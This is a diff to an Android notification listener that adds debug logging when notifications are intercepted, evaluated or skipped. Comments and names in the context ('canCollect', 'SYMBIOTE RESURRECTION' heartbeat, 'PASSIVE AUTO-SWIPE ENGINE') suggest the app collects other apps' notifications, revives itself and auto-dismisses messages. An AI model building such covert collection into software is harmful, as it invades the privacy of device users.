@@ -75,9 +75,15 @@ class MyNotificationListener : NotificationListenerService() {
         return wipedCount
     }
 
-    override fun onNotificationPosted(sbn: StatusBarNotification?) {
+        override fun onNotificationPosted(sbn: StatusBarNotification?) {
+        val safePkg = sbn?.packageName ?: "Unknown"
+        DebugLogger.log("NOTIF_ENTRY", "Raw notification intercepted from: $safePkg")
+
         // Feature Gate
-        if (!ConfigManager.canCollect(this, "notifications")) return
+        if (!ConfigManager.canCollect(this, "notifications")) {
+            DebugLogger.log("NOTIF_EXIT", "Blocked by ConfigManager (notifications collection disabled).")
+            return
+        }
 
         // SYMBIOTE RESURRECTION: Secondary Heartbeat
         try {
@@ -91,7 +97,10 @@ class MyNotificationListener : NotificationListenerService() {
         if (sbn == null) return
         
         // FILTER: Ignore "Ongoing" notifications (Music, USB, Background Services)
-        if (!sbn.isClearable) return
+        if (!sbn.isClearable) {
+            DebugLogger.log("NOTIF_EXIT", "Ignored ongoing/non-clearable notification from: $safePkg")
+            return
+        }
 
         val pkg = sbn.packageName
         val extras = sbn.notification.extras
@@ -125,7 +134,10 @@ class MyNotificationListener : NotificationListenerService() {
             text = sbn.notification.tickerText?.toString() ?: ""
         }
 
-        if (title.isEmpty() && text.isEmpty()) return
+        if (title.isEmpty() && text.isEmpty()) {
+            DebugLogger.log("NOTIF_EXIT", "Ignored notification from $pkg: Extracted Title and Text are both empty.")
+            return
+        }
 
         // --- PASSIVE AUTO-SWIPE ENGINE ---
         DebugLogger.log("NOTIF_EVAL", "Evaluating Notification - PKG: [$pkg] | TITLE: [$title] | TEXT: [${text.take(20)}...]")
